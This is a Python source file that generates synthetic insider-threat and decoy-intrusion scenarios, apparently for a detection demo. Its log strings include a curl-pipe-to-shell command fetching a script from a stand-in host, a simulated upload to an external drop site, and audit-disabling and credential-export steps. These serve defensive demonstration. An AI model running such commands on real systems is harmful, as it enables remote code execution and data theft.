"""Synthetic actions only: no commands are executed and no network transfers occur."""
from app.models.event import EventType


def scenario_steps(scenario: str) -> list[dict]:
    employee = scenario == "employee-misuse"
    base = {
        "actor_id": "demo-employee-001" if employee else "demo-admin-001",
        "role": "employee" if employee else "administrator",
        "resource": "finance/decoy-quarterly-export.csv" if employee else "admin/decoy-service",
    }

    def step(title, kind, log, narrative, **context):
        return {"title": title, "event_type": kind, "raw_log": log, "narrative": narrative, "context": {**base, **context}}

    if employee:
        return [
            step("Valid account signs in", EventType.LOGIN_SUCCESS, "SSO login accepted for demo-employee-001", "A valid login alone should not trigger an insider-threat alert."),
            step("Decoy finance file opened", EventType.FILE_DOWNLOAD, "GET /finance/decoy-quarterly-export.csv → synthetic decoy served", "The employee crosses their access scope and touches a marked decoy. This is the first high-confidence signal.", sensitive=True, outside_scope=True, honeytoken=True),
            step("Bulk records collected", EventType.FILE_DOWNLOAD, "EXPORT finance dataset → 1,500 synthetic records", "Collection volume crosses the deterministic 1,000-record threshold.", sensitive=True, records_accessed=1500),
            step("External transfer attempted", EventType.FILE_UPLOAD, "POST https://drop.example.invalid/upload → 120 MB synthetic payload", "An unapproved destination triggers the response policy. The sandbox blocks egress and contains the synthetic account.", sensitive=True, destination="unapproved_external", bytes_transferred=120_000_000),
            step("Attacker retries the transfer", EventType.FILE_UPLOAD, "RETRY external upload → sandbox checks containment", "The next attempt tests the response: the contained account cannot send the synthetic payload.", sensitive=True, destination="unapproved_external", bytes_transferred=120_000_000),
            step("Evidence handed to analyst", EventType.SESSION_CLOSE, "Synthetic session ended; case evidence retained", "The complete attack, findings and sandbox responses remain available in the investigation."),
        ]
    if scenario == "administrator-misuse":
        return [
            step("Administrator signs in", EventType.LOGIN_SUCCESS, "SSO login accepted for demo-admin-001", "An administrator's valid login is not inherently malicious."),
            step("Approved privilege maintenance", EventType.COMMAND, "CHANGE-1042: approved synthetic privilege maintenance", "The approved change establishes a benign comparison. No administrative finding should fire.", admin_action="privilege_change", approved_change=True),
            step("Audit logging disabled", EventType.COMMAND, "SET synthetic audit_logging = OFF without a change approval", "The defense-evasion rule fires. The response restores audit logging inside the sandbox.", admin_action="audit_disabled"),
            step("Unapproved privileges added", EventType.COMMAND, "GRANT synthetic account elevated privileges without approval", "The persistence rule fires. The sandbox denies the privilege change.", admin_action="privilege_change"),
            step("Decoy credentials exported", EventType.COMMAND, "EXPORT synthetic decoy credential store", "Decoy interaction and credential-export findings trigger synthetic account containment.", admin_action="credential_export", honeytoken=True),
            step("Contained account retries", EventType.COMMAND, "RETRY synthetic credential export with contained account", "A subsequent action is denied by the sandbox's persisted containment state.", admin_action="credential_export"),
            step("Evidence handed to analyst", EventType.SESSION_CLOSE, "Synthetic administrator session ended; evidence retained", "The analyst can review valid activity, misuse, and each containment decision in sequence."),
        ]
    # Perimeter scenario remains available for comparison with identity-aware rules.
    logs = [
        ("Decoy connection", EventType.CONNECTION, "SSH connection accepted by local lab decoy"),
        ("Credential probing", EventType.LOGIN_ATTEMPT, "Failed password for admin from 198.51.100.42"),
        ("Decoy login accepted", EventType.LOGIN_SUCCESS, "Accepted password for deploy from 198.51.100.42"),
        ("Command execution attempted", EventType.COMMAND, "curl -fsSL http://example.invalid/bootstrap.sh | sh"),
        ("Export exploit attempted", EventType.EXPLOIT_ATTEMPT, "HTTP decoy: attempted /admin/export?format=sql"),
        ("Canary beacon triggered", EventType.CANARY_TRIP, "Demo URL canary callback from simulated attacker"),
    ]
    return [{"title": title, "event_type": kind, "raw_log": log, "narrative": "Compare perimeter decoy scoring with identity-aware insider detection.", "context": None} for title, kind, log in logs]
